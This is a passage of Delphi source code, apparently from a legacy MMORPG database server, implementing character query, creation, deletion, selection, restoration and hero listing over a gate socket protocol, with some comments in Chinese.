                {//if HumDataDB.Get(nIndex, ChrRecord) >= 0 then begin
                QueryChrRcd.sName := sChrName;
                if HumDataDB.GetQryChar(nIndex, QueryChrRcd) >= 0 then begin
                  btSex := 0;
                  if not (QueryChrRcd.btSex in [0, 1]) then begin
                    QueryChrRcd.btSex := QueryChrRcd.btSex mod 2;
                    btSex := 1;
                  end;
                  if not (QueryChrRcd.btJob in [0..2]) then begin
                    QueryChrRcd.btJob := QueryChrRcd.btJob mod 3;
                    btSex := 1;
                  end;
                  if btSex <> 0 then begin
                    HumDataDB.UpdateQryChar(nIndex, QueryChrRcd);
                    //exit;
                  end;

                  btSex := QueryChrRcd.btSex;
                  sJob := IntToStr(QueryChrRcd.btJob);
                  sHair := IntToStr(QueryChrRcd.btHair);
                  sLevel := IntToStr(QueryChrRcd.wLevel);
                  if HumRecord.boSelected then sSendMsg := sSendMsg + '*';
                  sSendMsg := sSendMsg + sChrName + '/' + sJob + '/' + sHair + '/' + sLevel + '/' + IntToStr(btSex) + '/';
                  Inc(nChrCount);
                end;}
                if HumDataDB.Get(nIndex, ChrRecord) >= 0 then
                begin

                  btSex := 0;
                  if not (ChrRecord.Data.btSex in [0, 1]) then
                  begin
                    ChrRecord.Data.btSex := ChrRecord.Data.btSex mod 2;
                    btSex := 1;
                  end;
                  if not (ChrRecord.Data.btJob in [0..2]) then
                  begin
                    ChrRecord.Data.btJob := ChrRecord.Data.btJob mod 3;
                    btSex := 1;
                  end;
                  if btSex <> 0 then
                  begin
                    HumDataDB.Update(nIndex, ChrRecord);
                    //exit;
                  end;

                  btSex := ChrRecord.Data.btSex;
                  sJob := IntToStr(ChrRecord.Data.btJob);
                  sHair := IntToStr(ChrRecord.Data.btHair);
                  sLevel := IntToStr(ChrRecord.Data.Abil.Level);
                  if HumRecord.boSelected then
                    sSendMsg := sSendMsg + '*';
                  sSendMsg := sSendMsg + sChrName + '/' + sJob + '/' + sHair + '/' + sLevel + '/' + IntToStr(btSex) + '/';
                  Inc(nChrCount);
                end;
              end;
            end;
          end;
        finally
          HumDataDB.Close;
        end;
      end;
    finally
      HumChrDB.Close;
    end;
    ChrList.Free;
    SendUserSocket(UserInfo.Socket, UserInfo.sConnID, EncodeMessage(MakeDefaultMsg(SM_QUERYCHR, nChrCount, 0, 1, 0)) + EncodeString(sSendMsg));
  end
  else
  begin
    SendUserSocket(UserInfo.Socket, UserInfo.sConnID, EncodeMessage(MakeDefaultMsg(SM_QUERYCHR_FAIL, nChrCount, 0, 1, 0)));
    CloseUser(UserInfo.sConnID, CurGate);
  end;
end;
{
function TFrmUserSoc.QueryChrName(sAccount, sChrName, sIPaddr: string): Boolean;
var
  ChrList                   : TStringList;
  i                         : Integer;
  nIndex                    : Integer;
  ChrRecord                 : THumDataInfo;
  HumRecord                 : THumInfo;
  QuickID                   : pTQuickID;
begin
  Result := False;
  ChrList := TStringList.Create;
  try
    if HumChrDB.Open and (HumChrDB.FindByAccount(sAccount, ChrList) >= 0) then begin
      try
        if HumDataDB.OpenEx then begin
          for i := 0 to ChrList.Count - 1 do begin
            QuickID := pTQuickID(ChrList.Objects[i]);
            if (HumChrDB.GetBy(QuickID.nIndex, HumRecord)) and (not HumRecord.boDeleted) then begin
              if sChrName = QuickID.sChrName then
                Result := True;
            end;
          end;
        end;
      finally
        HumDataDB.Close;
      end;
    end;
  finally
    HumChrDB.Close;
  end;
  ChrList.Free;
end;
}

procedure TFrmUserSoc.OutOfConnect(const UserInfo: pTUserInfo);
var
  Msg: TDefaultMessage;
  sMsg: string;
begin
  Msg := MakeDefaultMsg(SM_OUTOFCONNECTION, 0, 0, 0, 0);
  sMsg := EncodeMessage(Msg);
  SendUserSocket(UserInfo.Socket, sMsg, UserInfo.sConnID);
end;

procedure TFrmUserSoc.DelChr(sData: string; var UserInfo: pTUserInfo);
var
  sChrName: string;
  boCheck, boDelLvl: Boolean;
  Msg: TDefaultMessage;
  sMsg: string;
  n10, nIndex: Integer;
  HumRecord: THumInfo;
  ChrRecord: THumDataInfo;
label
  FailExit;
begin
  boCheck := False;
  boDelLvl := False;
  if not g_boAllowDelChr then
    goto FailExit;
  sChrName := DeCodeString(sData);
  try
    if HumChrDB.Open then
    begin
      n10 := HumChrDB.Index(sChrName);
      if n10 >= 0 then
      begin
        HumChrDB.Get(n10, HumRecord);
        if HumRecord.sAccount = UserInfo.sAccount then
        begin
          try
            if HumDataDB.OpenEx then
            begin
              nIndex := HumDataDB.Index(sChrName);
              if nIndex >= 0 then
              begin
                HumDataDB.Get(nIndex, ChrRecord);
                if g_nAllowDelChrLvl < g_nAllowMaxDelChrLvl  then
                begin
                   if (ChrRecord.Data.Abil.Level >= g_nAllowDelChrLvl) and     //  增加删除校色等级限制区间
                      (ChrRecord.Data.Abil.Level <= g_nAllowMaxDelChrLvl) then
                   boDelLvl := True;
                end
                else if ChrRecord.Data.Abil.Level >= g_nAllowDelChrLvl then
                  boDelLvl := True;
              end;
            end;
          finally
            HumDataDB.Close;
          end;
          if boDelLvl then
          begin
            HumRecord.Header.boDeleted := True;
            HumRecord.boDeleted := True;
            HumRecord.dModDate := Now();
            HumChrDB.Update(n10, HumRecord);
            boCheck := True;
          end;
        end;
      end;
    end;
  finally
    HumChrDB.Close;
  end;
  FailExit:
  if boCheck then
    Msg := MakeDefaultMsg(SM_DELCHR_SUCCESS, 0, 0, 0, 0)
  else
    Msg := MakeDefaultMsg(SM_DELCHR_FAIL, 0, 0, 0, 0);
  sMsg := EncodeMessage(Msg);
  SendUserSocket(UserInfo.Socket, UserInfo.sConnID, sMsg);
end;

procedure TFrmUserSoc.NewChr(sData: string; var UserInfo: pTUserInfo); //004A3C08
var
  SSS: string;
  Data, sAccount, sChrName, sHair, sJob, sSex: string;
  nCode: Integer;
  Msg: TDefaultMessage;
  sMsg: string;
  HumRecord: THumInfo;
  i: Integer;
label
  lfailexit;
begin
  SSS := 'NewChrName';
  nCode := -1;
  Data := DeCodeString(sData);
  Data := GetValidStr3(Data, sAccount, ['/']);
  Data := GetValidStr3(Data, sChrName, ['/']);
  Data := GetValidStr3(Data, sHair, ['/']);
  Data := GetValidStr3(Data, sJob, ['/']);
  Data := GetValidStr3(Data, sSex, ['/']);
  if Trim(Data) <> '' then
    nCode := 0;
  sChrName := Trim(sChrName);
  if (nCode = -1) and (Length(sChrName) < 3) then
    nCode := 0;
  if (nCode = -1) and not CheckDenyChrName(sChrName) then
    nCode := 2;
  if (nCode = -1) and not CheckChrName(sChrName) then
    nCode := 0;
  if (nCode = -1) and IsFilterSpecChar(sChrName) then
    nCode := 0;
  if (nCode = -1) and not CheckDenyChrOfName(sChrName) then
    nCode := 0;
  if (nCode = -1) and (sChrName[Length(sChrName)] = #$A9) then
    nCode := 0;
  if (nCode = -1) and (sChrName[Length(sChrName)] = #$0A) then
    nCode := 0;
  if nCode <> -1 then
    goto lfailexit;

  for i := 1 to Length(sChrName) do
  begin
    if IsFilterChar(sChrName[i]) then
    begin
      nCode := 0;
      Break;
    end;
  end;

  if nCode <> -1 then
    goto lfailexit;

  try
    HumDataDB.Lock;
    if HumDataDB.Index(sChrName) >= 0 then //角色已经存在
      nCode := 2;
    if (HumChrDB.ChrCountOfAccount(sAccount) >= 2) or (HumChrDB.AllChrCountOfAccount(sAccount) >= 20) then //已经存在两个角色
      nCode := 3;
  finally
    HumDataDB.UnLock;
  end;

  if nCode = -1 then
  begin
    FillChar(HumRecord, SizeOf(THumInfo), #0);
    try
      if HumChrDB.Open then
      begin //if HumChrDB.ChrCountOfAccount(sAccount) < 2 then
        HumRecord.sChrName := sChrName;
        HumRecord.sAccount := sAccount;
        HumRecord.boDeleted := False;
        HumRecord.btCount := 0;
        HumRecord.Header.sName := sChrName;
        if HumRecord.Header.sName <> '' then
          if not HumChrDB.Add(HumRecord) then
            nCode := 2;
      end;
    finally
      HumChrDB.Close;
    end;

    if nCode = -1 then
    begin
      if NewChrData(sChrName, Str_ToInt(sSex, 0), Str_ToInt(sJob, 0), Str_ToInt(sHair, 0)) then
        nCode := 1;
    end
    else
    begin
      FrmDBSrv.DelHum(sChrName);
      nCode := 4;
    end;
  end;
  lfailexit:
  if nCode = 1 then
    Msg := MakeDefaultMsg(SM_NEWCHR_SUCCESS, 0, 0, 0, 0)
  else
    Msg := MakeDefaultMsg(SM_NEWCHR_FAIL, nCode, 0, 0, 0);
  sMsg := EncodeMessage(Msg);
  SendUserSocket(UserInfo.Socket, UserInfo.sConnID, sMsg);
end;

function TFrmUserSoc.SelectChr(sData: string; var UserInfo: pTUserInfo): Boolean;
var
  sAccount: string;
  sChrName: string;
  ChrList: TStringList;
  HumRecord: THumInfo;
  i: Integer;
  nIndex: Integer;
  nMapIndex: Integer;
  QuickID: pTQuickID;
  ChrRecord: THumDataInfo;
  sCurMap: string;
  //boCharOK                  : Boolean;
  boDataOK: Boolean;
  sDefMsg: string;
  sRouteMsg: string;
  sRouteIP: string;
  nRoutePort: Integer;
begin
  Result := False;
  sChrName := GetValidStr3(DeCodeString(sData), sAccount, ['/']);
  boDataOK := False;
  //boCharOK := False;
  if UserInfo.sAccount = sAccount then
  begin
    try
      if HumChrDB.Open then
      begin
        ChrList := TStringList.Create;
        if HumChrDB.FindByAccount(sAccount, ChrList) >= 0 then
        begin
          for i := 0 to ChrList.Count - 1 do
          begin
            QuickID := pTQuickID(ChrList.Objects[i]);
            nIndex := QuickID.nIndex;
            if HumChrDB.GetBy(nIndex, HumRecord) then
            begin
              if HumRecord.sChrName = sChrName then
              begin
                //boCharOK := True;
                HumRecord.boSelected := True;
                HumChrDB.UpdateBy(nIndex, HumRecord);
              end
              else if HumRecord.boSelected then
              begin
                HumRecord.boSelected := False;
                HumChrDB.UpdateBy(nIndex, HumRecord);
              end;
            end;
          end;
        end;
        ChrList.Free;
      end;
    finally
      HumChrDB.Close;
    end;
    try
      if {boCharOK and}  HumDataDB.OpenEx then
      begin
        nIndex := HumDataDB.Index(sChrName);
        if nIndex >= 0 then
        begin
          HumDataDB.Get(nIndex, ChrRecord);
          sCurMap := ChrRecord.Data.sCurMap;
          boDataOK := True;
        end;
      end;
    finally
      HumDataDB.Close;
    end;
  end;
  if boDataOK then
  begin
    nMapIndex := GetMapIndex(sCurMap);
    sRouteIP := GateRouteIP(nMapIndex, CurGate.sRemoteAddr, nRoutePort);
    if g_boDynamicIPMode then
      sRouteIP := UserInfo.sGateIPaddr;
    sRouteMsg := EncodeString(sRouteIP + '/' + IntToStr(nRoutePort { + nMapIndex}));

{$IFDEF PUSHHUMANRCD}
    FrmDBSrv.GetLoadHumanRcd(sAccount, sChrName);
{$ENDIF}

    sDefMsg := EncodeMessage(MakeDefaultMsg(SM_STARTPLAY, 0, 0, 0, 0));
    SendUserSocket(UserInfo.Socket, UserInfo.sConnID, sDefMsg + sRouteMsg);
    FrmIDSoc.SetGlobaSessionPlay(UserInfo.nSessionID);
    Result := True;
  end
  else
    SendUserSocket(UserInfo.Socket, UserInfo.sConnID, EncodeMessage(MakeDefaultMsg(SM_STARTFAIL, 0, 0, 0, 0)));
end;

function TFrmUserSoc.QueryDelChr(var UserInfo: pTUserInfo): Boolean;
var
  i, nIndex: Integer;
  nDelHumCount: Integer;
  ChrList: TStringList;
  QuickID: pTQuickID;
  ChrRecord: THumDataInfo;
  sChrName: string;
  sDefMsg: string;
  sSendMsg: string;
  HumRecord: THumInfo;
begin
  Result := False;
  sSendMsg := '';
  nDelHumCount := 0;
  if FrmIDSoc.CheckSession(UserInfo.sAccount, UserInfo.sUserIPaddr, UserInfo.nSessionID) then
  begin
    ChrList := TStringList.Create;
    try
      if HumChrDB.Open then
      begin
        if HumChrDB.FindByAccount(UserInfo.sAccount, ChrList) >= 0 then
        begin
          try
            if HumDataDB.OpenEx then
            begin
              for i := 0 to ChrList.Count - 1 do
              begin
                QuickID := pTQuickID(ChrList.Objects[i]);
                if QuickID.nSelectID = UserInfo.nSelGateID then
                begin
                  if HumChrDB.GetBy(QuickID.nIndex, HumRecord) then
                  begin
                    if HumRecord.boDeleted then
                    begin
                      sChrName := QuickID.sChrName;
                      nIndex := HumDataDB.Index(sChrName);
                      if nIndex >= 0 then
                      begin
                        if HumDataDB.Get(nIndex, ChrRecord) >= 0 then
                        begin
                          if ChrRecord.Data.sHeroMasterName = '' then
                          begin
                            sSendMsg := sSendMsg + sChrName + '/' +
                              IntToStr(ChrRecord.Data.btJob) + '/' +
                              IntToStr(ChrRecord.Data.btSex) + '/' +
                              IntToStr(ChrRecord.Data.Abil.Level) + '/' +
                              IntToStr(ChrRecord.Data.btSex) + '/';
                            Inc(nDelHumCount);
                          end;
                        end;
                      end;
                    end;
                  end;
                end;
              end;
            end;
          finally
            HumDataDB.Close;
          end;
        end;
      end;
    finally
      HumChrDB.Close;
    end;
    ChrList.Free;
  end;
  if (sSendMsg <> '') then
  begin
    sDefMsg := EncodeMessage(MakeDefaultMsg(SM_QUERYDELCHR, 1, 0, 0, nDelHumCount));
    SendUserSocket(UserInfo.Socket, UserInfo.sConnID, sDefMsg + EncodeString(sSendMsg));
    Result := True;
  end
  else
    SendUserSocket(UserInfo.Socket, UserInfo.sConnID, EncodeMessage(MakeDefaultMsg(SM_QUERYDELCHR, 0, 0, 0, 0)));
end;

function TFrmUserSoc.GetBackDelChr(sData: string; var UserInfo: pTUserInfo): Boolean;
var
  tIsHero: Boolean;
  sChrName: string;
  nIndex, nIndex2: Integer;
  nRetCode: Integer;
  HumRecord: THumInfo;
  ChrRecord: THumDataInfo;
  sDefMsg: string;
begin
  nRetCode := 0;
  Result := False;
  tIsHero := False;
  sChrName := DeCodeString(sData);
  if sChrName <> '' then
  begin
    try
      if HumDataDB.OpenEx then
      begin
        nIndex2 := HumDataDB.Index(sChrName);
        if nIndex2 >= 0 then
        begin
          if HumDataDB.Get(nIndex2, ChrRecord) >= 0 then
          begin
            if ChrRecord.Data.sHeroMasterName <> '' then
            begin
              tIsHero := True;
            end;
          end
          else
            tIsHero := True;
        end
        else
          tIsHero := True;
      end
      else
        tIsHero := True;
    finally
      HumDataDB.Close;
    end;

    if tIsHero then
    begin
      nRetCode := 4;
    end
    else
    begin
      try
        if HumChrDB.Open then
        begin
          nIndex := HumChrDB.Index(sChrName);
          if (nIndex >= 0) and (HumChrDB.Get(nIndex, HumRecord) <> -1) then
          begin
            if (HumRecord.sAccount = UserInfo.sAccount) then
            begin
              if HumChrDB.ChrCountOfAccount(HumRecord.sAccount) < (2 + Integer(g_boAllowMultiChr)) then
              begin
                if HumRecord.boDeleted then
                begin
                  HumRecord.Header.boDeleted := False;
                  HumRecord.boDeleted := False;
                  HumRecord.boSelected := True;
                  Inc(HumRecord.btCount);
                  HumChrDB.Update(nIndex, HumRecord);
                  nRetCode := 1;
                end
                else
                  nRetCode := 2; //[失败] 角色并未被删除。
              end
              else
                nRetCode := 3; //[失败] 你最多只能为一个帐号设置2个角色。
            end
            else
              nRetCode := 5; //[失败] 角色已被删除。
          end
          else
            nRetCode := 4; //[失败] 没有找到被删除的角色。
        end;
      finally
        HumChrDB.Close;
      end;
    end;
  end;
  sDefMsg := EncodeMessage(MakeDefaultMsg(SM_GETBACKDELCHR, nRetCode, 0, 0, 0));
  SendUserSocket(UserInfo.Socket, UserInfo.sConnID, sDefMsg);
  if nRetCode = 1 then
    Result := True;
end;

function TFrmUserSoc.GateRouteIP(nSerIdx: Integer; sGateIP: string; var nPort: Integer): string;

  function GetRoute(RouteInfo: pTRouteInfo; var nGatePort: Integer): string;
  var
    nGateIndex: Integer;
  begin
    nGateIndex := Random(RouteInfo.nGateCount);
    Result := RouteInfo.sGameGateIP[nGateIndex];
    nGatePort := RouteInfo.nGameGatePort[nGateIndex];
  end;

var
  i: Integer;
  RouteInfo: pTRouteInfo;
begin
  nPort := 0;
  Result := '';
  for i := Low(g_RouteInfo) to High(g_RouteInfo) do
  begin
    RouteInfo := @g_RouteInfo[i];
    if (RouteInfo.nServerIdx = nSerIdx) and (RouteInfo.sSelGateIP = sGateIP) then
    begin
      Result := GetRoute(RouteInfo, nPort);
      Break;
    end;
  end;
end;

function TFrmUserSoc.GetMapIndex(sMap: string): Integer; //0x004A24D4
var
  i: Integer;
begin
  Result := 0;
  for i := 0 to MapList.Count - 1 do
  begin
    if MapList.Strings[i] = sMap then
    begin
      Result := Integer(MapList.Objects[i]);
      Break;
    end;
  end;
end;

procedure TFrmUserSoc.SendUserSocket(Socket: TCustomWinSocket; sSessionID, sSendMsg: string);
begin
  Socket.SendText('%' + sSessionID + '/#' + sSendMsg + '!$');
end;

function TFrmUserSoc.CheckDenyChrName(sChrName: string): Boolean;
var
  i: Integer;
begin
  Result := True;
  //g_CheckCode.dwThread0 := 1000700;
  for i := 0 to DenyChrNameList.Count - 1 do
  begin
    //g_CheckCode.dwThread0 := 1000701;
    if CompareText(sChrName, DenyChrNameList.Strings[i]) = 0 then
    begin
      //g_CheckCode.dwThread0 := 1000702;
      Result := False;
      Break;
    end;
  end;
  //g_CheckCode.dwThread0 := 1000703;
end;

function TFrmUserSoc.CheckDenyChrOfName(sChrName: string): Boolean;
var
  i: Integer;
  List: TStringList;
begin
  Result := True;
  if not g_boAllowCreateCharOpt1 then
  begin
    List := TStringList.Create;
    for i := $30 to $39 do
      List.Add(Char(i));
    for i := $61 to $7A do
      List.Add(Char(i));
    for i := 0 to List.Count - 1 do
    begin
      if Pos(List.Strings[i], sChrName) > 0 then
      begin
        Result := False;
        List.Free;
        Exit;
      end;
    end;
  end;

  for i := 0 to DenyChrOfNameList.Count - 1 do
  begin
    if Pos(DenyChrOfNameList.Strings[i], sChrName) > 0 then
    begin
      Result := False;
      Break;
    end;
  end;
end;

function TFrmUserSoc.QueryHeroChr(sAccount, sHumName, sIPaddr: string; nSessionID: Integer; var HerosInfo: THerosInfo): Boolean;
var
  nChrCount: Integer;
  ChrList: TStringList;
  i: Integer;
  nIndex: Integer;
  ChrRecord: THumDataInfo;
  HumRecord: THumInfo;
  QuickID: pTQuickID;
  sChrName: string;
  sSendMsg: string;
begin
  Result := False;
  sSendMsg := '';
  nChrCount := 0;
  FillChar(HerosInfo, SizeOf(THerosInfo), 0);

  if not g_fMutiHero then
  begin
    Exit;
  end;

  if FrmIDSoc.CheckSession(sAccount, sIPaddr, nSessionID) then
  begin
    //FrmIDSoc.SetGlobaSessionNoPlay(nSessionID);
    ChrList := TStringList.Create;
    try
      if HumChrDB.Open and (HumChrDB.FindByAccount(sAccount, ChrList) >= 0) then
      begin
        try
          if HumDataDB.OpenEx then
          begin
            for i := 0 to ChrList.Count - 1 do
            begin
              QuickID := pTQuickID(ChrList.Objects[i]);

              if sHumName = QuickID.sChrName then
                Continue;

              if HumChrDB.GetBy(QuickID.nIndex, HumRecord) then
              begin
                sChrName := QuickID.sChrName;
                nIndex := HumDataDB.Index(sChrName);
                if (nIndex < 0) then
                  Continue;

                if HumDataDB.Get(nIndex, ChrRecord) >= 0 then
                begin
                  if ChrRecord.Data.sHeroMasterName = '' then
                  begin
                    //人物
                    {if not HumRecord.boDeleted then begin
                      if not g_boGetChrAsHero then
                        Continue;
                    end else begin
                      if not g_boGetDelChrAsHero then
                        Continue;
                    end;}
                    Continue;
                  end
                  else
                  begin

                    if ChrRecord.Data.sHeroName <> '' then
                      Continue;

                    //英雄
                    if not g_cbGetAllHeros then
                    begin
                      if CompareText(ChrRecord.Data.sHeroMasterName, sHumName) <> 0 then
                        Continue;
                    end;
                  end;

                  HerosInfo[nChrCount].ChrName := ChrRecord.Data.sChrName;
                  HerosInfo[nChrCount].Level := ChrRecord.Data.Abil.Level;
                  HerosInfo[nChrCount].Job := ChrRecord.Data.btJob;
                  HerosInfo[nChrCount].Sex := ChrRecord.Data.btSex;

                  Inc(nChrCount);
                  Result := True;
                  if nChrCount > High(HerosInfo) then
                    Break;
                end;
              end;
            end;
          end;
        finally
          HumDataDB.Close;
        end;
      end;
    finally
      HumChrDB.Close;
    end;
    ChrList.Free;
  end;
end;

end.
